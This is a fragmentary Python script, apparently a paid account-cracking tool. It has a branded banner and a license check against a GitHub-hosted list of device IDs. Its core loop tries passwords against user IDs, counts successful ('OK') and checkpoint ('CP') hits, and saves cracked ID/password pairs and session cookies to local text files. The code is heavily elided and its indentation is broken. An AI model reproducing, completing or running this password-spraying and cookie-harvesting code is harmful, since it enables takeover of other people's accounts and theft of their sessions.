...
try:
	prox= requests.get('https://github.com/ull36tm/PAID-LITON/blob/main/Afroveal5.txt').text
...
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
      ┌━━━━━━━━━━━━━━━━━ 𓆩𝐋𝐢𝐭𝐨𝐧𓆪 ━━━━━━━━━━━━━━━━━━┑
               \033[34;1mCREATED BY   :  𝐔𝐋𝐋 𝐋𝐢𝐭𝐨𝐧            
               \033[33;1mFACEBOK      :  𓆩𝐋𝐢𝐭𝐨𝐧𓆪              
               \033[38;5;46mGITHUB       :  𝐔𝐋𝐋36𝐓𝐌       
               \033[35;1mSTATUS       :   𝐏𝐀𝐈𝐃😴            
               \033[37;1mTEAM         :  𓆩𝐔𝐩𝐝𝐚𝐭 𝐋𝐨𝐠𝐨 𝐋𝐢𝐭𝐨𝐧𓆪                 
               \033[33;1mTOOL VIRSION :  2.09                    
               \x1b[38;5;196mTOOL WORK    :  𝐎𝐍𝐋𝐘 𝐃𝐀𝐓𝐀           
      └━━━━━━━━━━━━━━━━━ 𓆩𝐋𝐢𝐭𝐨𝐧𓆪 ━━━━━━━━━━━━━━━━━┘
""")
...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/ull36tm/PAID-LITON/blob/main/Afroveal5.txt').text
    if id in httpCaht:
      print("\033[38;5;46mYour Token is Successfully Approved")
      msg = str(os.geteuid())
      time.sleep(0.5)
      menu()
      menu1()
...
def c(uid,pwx,ln):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r%s[𝐔𝐋𝐋_𝐋𝐢𝐭𝐨𝐧] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
            sys.stdout.flush()
         ...
         #   log_cookies=session.cookies.get_dict().keys()
            ...
            #	botok(uid,ps)
            	...
            	cid = coki[65:80]
            	print('\033[1;92mlLITON ULL-OK[😁]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
            	print('\033[1;92m[\033[1;92m🍪\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('ULL-OK.txt', 'a').write( cid+' | '+ps+'\n')
            	open('ULL-coki.txt', 'a').write(coki+'\n')
            	...
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[82:97]
            	print('\33[1;30m(ULL-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
            	#print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('ULL-CP.txt', 'a').write( uid+' | '+ps+' \n')
            	cps.append(cid)
            	break
            else:
            	#print (random_header())
